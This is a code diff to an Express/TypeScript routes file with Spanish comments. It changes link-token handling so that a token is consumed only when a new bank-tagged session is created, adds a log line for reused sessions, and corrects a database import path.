@@ -209,7 +209,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
         await storage.getSessionById(tokenResult.sessionId) : 
         null;
 
-      // Si no existe sesión, crearla
+      // Si no existe sesión, crearla y consumir el token
       if (!session) {
         // Generar código de 8 dígitos para sessionId y folio
         let sessionId = '';
@@ -229,8 +229,13 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
         // Actualizar el token con el sessionId creado
         await linkTokenService.updateTokenSession(token, sessionId);
+        
+        // AHORA sí consumir el token - solo cuando se crea la sesión real
+        await linkTokenService.consumeToken(token);
 
-        console.log(`[Links] Nueva sesión creada desde token: ${sessionId}, banco: ${session.banco}`);
+        console.log(`[Links] Nueva sesión creada desde token: ${sessionId}, banco: ${session.banco}, token consumido`);
+      } else {
+        console.log(`[Links] Reutilizando sesión existente: ${session.sessionId}`);
       }
 
       // Obtener la URL base desde la configuración del sitio
@@ -283,7 +288,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
         await storage.getSessionById(tokenResult.sessionId) : 
         null;
 
-      // Si no existe sesión, crearla
+      // Si no existe sesión, crearla y consumir el token
       if (!session) {
         // Generar código de 8 dígitos para sessionId y folio
         let sessionId = '';
@@ -303,8 +308,13 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
         // Actualizar el token con el sessionId creado
         await linkTokenService.updateTokenSession(token, sessionId);
+        
+        // AHORA sí consumir el token - solo cuando se crea la sesión real
+        await linkTokenService.consumeToken(token);
 
-        console.log(`[Links] Nueva sesión creada desde token: ${sessionId}, banco: ${session.banco}`);
+        console.log(`[Links] Nueva sesión creada desde token: ${sessionId}, banco: ${session.banco}, token consumido`);
+      } else {
+        console.log(`[Links] Reutilizando sesión existente: ${session.sessionId}`);
       }
 
       // Obtener la URL base desde la configuración del sitio
@@ -4299,7 +4309,7 @@ _Fecha: ${new Date().toLocaleString('es-MX')}_
 
     try {
       // Query para traer sesiones activas con links activos
-      const { db } = await import('../db');
+      const { db } = await import('./db');
       const activeSessions = await db
         .select({
           sessionId: sessions.sessionId,
